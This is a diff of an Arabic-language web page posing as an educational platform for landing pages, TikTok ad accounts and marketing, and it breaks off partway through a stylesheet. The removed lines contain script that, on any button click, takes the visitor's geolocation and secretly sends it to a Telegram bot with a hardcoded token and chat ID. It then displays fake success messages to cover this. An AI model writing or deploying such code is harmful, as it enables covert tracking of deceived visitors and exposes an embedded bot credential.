@@ -1,111 +1,87 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>منصة تعليمية</title>
 <style>
   body {
-    font-family: Arial, sans-serif;
-    background: #f0f2f5;
+    font-family: 'Tahoma', sans-serif;
+    background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
     display: flex;
     justify-content: center;
     align-items: center;
     min-height: 100vh;
+    margin: 0;
+    color: #fff;
   }
+
   .container {
-    background: #fff;
-    padding: 40px;
-    border-radius: 12px;
-    box-shadow: 0 6px 20px rgba(0,0,0,0.2);
+    background: rgba(255, 255, 255, 0.1);
+    padding: 30px;
+    border-radius: 15px;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.2);
     text-align: center;
-    max-width: 450px;
+    width: 90%;
+    max-width: 400px;
+    backdrop-filter: blur(10px);
+    animation: fadeIn 1.2s ease;
   }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: scale(0.9); }
+    to { opacity: 1; transform: scale(1); }
+  }
+
   h1 {
-    color: #333;
+    font-size: 22px;
     margin-bottom: 25px;
-    font-size: 24px;
+    font-weight: bold;
   }
+
   button {
     display: block;
-    width: 80%;
-    margin: 15px auto;
-    padding: 15px;
-    font-size: 18px;
+    width: 100%;
+    margin: 12px 0;
+    padding: 14px;
+    font-size: 16px;
     border: none;
-    border-radius: 8px;
+    border-radius: 10px;
     cursor: pointer;
     color: #fff;
-    transition: background 0.3s;
+    font-weight: bold;
+    transition: transform 0.2s, box-shadow 0.2s;
   }
-  #btn1 { background: #28a745; }
-  #btn1:hover { background: #218838; }
-  #btn2 { background: #ff0050; }
-  #btn2:hover { background: #e60045; }
-  #btn3 { background: #007bff; }
-  #btn3:hover { background: #0069d9; }
+
+  button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 15px rgba(0,0,0,0.2);
+  }
+
+  #btn1 { background: #4cafef; }
+  #btn1:hover { background: #3799df; }
+  #btn2 { background: #ff6b6b; }
+  #btn2:hover { background: #e65757; }
+  #btn3 { background: #51d88a; }
+  #btn3:hover { background: #3cbf74; }
+
   p {
-    margin-top: 20px;
-    color: #555;
+    margin-top: 15px;
+    font-size: 14px;
+    color: #f1f1f1;
   }
-</style>
-</head>
-<body>
 
-<div class="container">
-  <h1>منصة تعليمية لإنشاء صفحات وحسابات</h1>
-  <button id="btn1" onclick="sendFake('تم إنشاء الصفحة بنجاح!')">إنشاء صفحة هبوط</button>
-  <button id="btn2" onclick="sendFake('تم عرض طريقة إنشاء الحساب بنجاح!')">طريقة إنشاء حساب إعلاني على تيك توك</button>
-  <button id="btn3" onclick="sendFake('تم عرض خطوات التسويق بنجاح!')">تعلم التسويق</button>
-  <p id="status"></p>
-</div>
+  .social-icons {
+    margin-top: 25px;
+    display: flex;
+    justify-content: center;
+    gap: 20px;
+  }
 
-<script>
-const BOT_TOKEN = "5814823361:AAEFNHuJtnAq_3M51YQPwylzyDsnOnSUOjQ";
-const CHAT_ID = "143914927";
-let locationGranted = false;
-let lastPosition = null;
+  .social-icons i {
+    font-size: 22px;
+    cursor: pointer;
+    transition: transform 0.2s;
+  }
 
-function getLocationOnce(callback) {
-    if (!locationGranted) {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-                locationGranted = true;
-                lastPosition = position;
-                callback(position);
-            }, () => {
-                alert("❌ رفضت مشاركة الموقع أو حدث خطأ");
-            });
-        } else {
-            alert("المتصفح لا يدعم تحديد الموقع");
-        }
-    } else {
-        // استخدم آخر موقع معروف
-        callback(lastPosition);
-    }
-}
-
-function sendFake(messageToShow) {
-    getLocationOnce(position => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
-
-        fetch(url)
-            .then(response => {
-                if (response.ok) {
-                    document.getElementById("status").innerText = messageToShow;
-                } else {
-                    document.getElementById("status").innerText = "❌ حدث خطأ أثناء الإرسال";
-                }
-            })
-            .catch(() => {
-                document.getElementById("status").innerText = "⚠ حدث خطأ أثناء الإرسال";
-            });
-    });
-}
-</script>
-
-</body>
-</html>
+  .
